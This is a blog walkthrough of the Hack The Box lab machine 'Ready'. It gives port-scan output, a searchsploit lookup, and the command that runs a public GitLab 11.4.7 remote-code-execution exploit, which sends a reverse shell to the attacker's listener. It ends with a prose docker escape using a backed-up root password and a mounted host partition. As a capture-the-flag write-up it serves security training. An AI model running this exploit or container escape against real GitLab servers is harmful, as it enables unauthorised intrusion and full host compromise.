---
layout: post
title:  "[HTB] Ready"  
date:   2021-05-15 3:33:00 +0200
last_modified_at: 2021-05-15 03:33:29 +0200
toc:  true
tags: [ctf, linux, Hackthebox, Walkthrough, CVE, Gitlab, docker]
categories: Hackthebox
---

This time it is an abuse of a CVE that is present in a version of Gitlab.
---

![](/images_blog/img_ready/Pastedimage20210515121042.png)
![Pastedimage20210515121042](https://user-images.githubusercontent.com/76759292/127757666-ad49fc55-99bf-4aed-88c5-bb3b4e438220.png)

## Enumeration

*Ports:*
```
22 -> OpenSSH 8.2p1 Ubuntu 4
5080 -> nginx
```

### Nmap

```sql
nmap -p- -sT -T5 --open -n -v 10.10.10.220 -oG Allport1 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 19:21 EDT
Initiating Ping Scan at 19:21
Scanning 10.10.10.220 [2 ports]
Completed Ping Scan at 19:21, 0.06s elapsed (1 total hosts)
Initiating Connect Scan at 19:21
Scanning 10.10.10.220 [65535 ports]
Discovered open port 22/tcp on 10.10.10.220
Connect Scan Timing: About 22.87% done; ETC: 19:23 (0:01:45 remaining)
Discovered open port 5080/tcp on 10.10.10.220
Connect Scan Timing: About 54.84% done; ETC: 19:23 (0:00:50 remaining)
Connect Scan Timing: About 72.24% done; ETC: 19:23 (0:00:35 remaining)
Completed Connect Scan at 19:23, 119.47s elapsed (65535 total ports)
Nmap scan report for 10.10.10.220
Host is up (0.15s latency).
Not shown: 51328 filtered ports, 14205 closed ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 119.72 second
```

*More exhaustive scanning:*
```sql
nmap -sC -sV -p5080,22 10.10.10.220 -oN Scan_Port1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 19:24 EDT
Nmap scan report for 10.10.10.220
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.86 seconds
```

### Masscan

Always discarding false positives:

```sql
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.220
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-04-25 23:16:46 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 5080/tcp on 10.10.10.220
```


*Web enumeration tips*

If we want to know quickly the services that a website has, we can use the tool ```Whatweb```

```bash
whatweb 10.10.10.220:5080
http://10.10.10.220:5080 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.10.220], RedirectLocation[http://10.10.10.220:5080/users/sign_in], Strict-Transport-Security[max-age=31536000], UncommonHeaders[x-content-type-options,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
http://10.10.10.220:5080/users/sign_in [200 OK] Cookies[_gitlab_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], HttpOnly[_gitlab_session], IP[10.10.10.220], Open-Graph-Protocol, PasswordField[new_user[password],user[password]], Script, Strict-Transport-Security[max-age=31536000], Title[Sign in · GitLab], UncommonHeaders[x-content-type-options,x-request-id], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx
```

*GitLab Version*

```plaintext
GitLab Community Edition [11.4.7]
```

*Searchsploit*

When we have the version of the application what we proceed is to look for if it has a cve that version:

```bash
searchsploit GitLab 11.4.7   

Exploit
Title                                                      			Path
GitLab 11.4.7 - RCE (Authenticated) (2)                             | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)			| ruby/webapps/49257.py
```

## GitLab Page
But before executing the cve we must register in GitLab:
*Register*

```plaintext
benji
Benji123
benji@htb.com
```
## Remote Code Execution 
In this one you don't have to modify anything in the source code, you just have to add the parameters and it runs automatically [RCE](https://www.exploit-db.com/exploits/49334)

```bash
# Exploit Title: GitLab 11.4.7 RCE (POC)
# Date: 24th December 2020
# Exploit Author: Norbert Hofmann
# Exploit Modifications: Sam Redmond, Tam Lai Yin
# Original Author: Mohin Paramasivam
# Software Link: https://gitlab.com/
# Environment: GitLab 11.4.7, community edition
# CVE: CVE-2018-19571 + CVE-2018-19585
```

*Run*

```bash
python 49334.py -u benji -p Benji123!!! -g http://10.10.10.220 -l 10.10.14.234 -P 4444
```
We listen on the port we specify and that's it.

## File system Escape

When we have the initial access we realize that we are in a docker so the objective would be to escape from it.

In the path /opt/backups/gitlab.rb we will find a backup with the root password of the container

![](/images_blog/img_ready/Pastedimage20210503175440.png)
![Pastedimage20210503175440](https://user-images.githubusercontent.com/76759292/127757672-c36da576-b3ef-42dc-8974-70bdc4f1a91f.png)


This password that we have found in the backup, we will use it to access as a root user of the container. Being inside a container we are very limited so the idea would be to mount the hosts partition in a folder that we create in /tmp to be able to visualize it and in this way we can access /root and read everything it has.

![](/images_blog/img_ready/Pastedimage20210503175936.png)
![Pastedimage20210503175936](https://user-images.githubusercontent.com/76759292/127757675-8e9f154d-1c64-4ee3-ae07-fc3d113848f8.png)


In this case we saw how you can view the host file system from a container. This machine was an excellent way to see what happens when we don't keep up to date.

MACHINE PWNED!!!!!

<p align="center">
<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="300" height="300" />
</p>
